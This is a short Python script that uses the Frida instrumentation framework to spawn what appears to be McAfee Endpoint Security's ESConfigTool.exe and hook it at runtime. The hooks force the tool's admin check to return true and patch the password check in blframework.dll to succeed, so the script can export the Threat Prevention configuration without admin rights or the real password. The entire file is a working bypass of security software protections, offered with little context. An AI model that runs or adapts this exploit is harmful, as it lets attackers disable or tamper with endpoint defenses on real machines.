#!/usr/bin/env python

import frida

def get_script():
  script = """
const configBase = Module.findBaseAddress('ESConfigTool.exe');
//const adminCheck = configBase.add(0x5240); //32
const adminCheck = configBase.add(0x5f30); //64
const BLInvokeMethod = Module.findExportByName('blframework.dll','BLInvokeMethod')

console.log('[-] Base address is:',configBase);
console.log('[-] Admin check is:',adminCheck);
console.log('[-] BLInvokeMethod:',BLInvokeMethod);

Interceptor.attach(adminCheck, {
  onEnter: function (args) {
    console.log('[+] Hooked admin check function');
  },
  onLeave: function (retval) {
    console.log('[+] Returning true for admin check');
    retval.replace(1);
  }
});

Interceptor.attach(BLInvokeMethod, {
  onEnter: function (args) {
    console.log('[+] Hooked BLInvokeMethod function');
  },
  onLeave: function (retval) {
    console.log('[+] Patching password check function');
    retval.replace(0x0);
  }
});

"""
  return script

def main():
  args = [
    'ESConfigTool.exe',
    '/export',
    'c:\\tem\\ESP.xml',
    '/module',
    'TP',
    '/unlock',
    'starwars',
    # This may fail sometimes, not sure why. Versions?
    #'/plaintext'
  ]

  devmgr = frida.get_device_manager()
  devmgr.add_remote_device('127.0.0.1')
  rdev = frida.get_device('tcp@127.0.0.1')

  pid = rdev.spawn(args)
  session = rdev.attach(pid)
  session.create_script(get_script()).load()
  rdev.resume(pid)
  input()

if __name__ == '__main__':
  main()
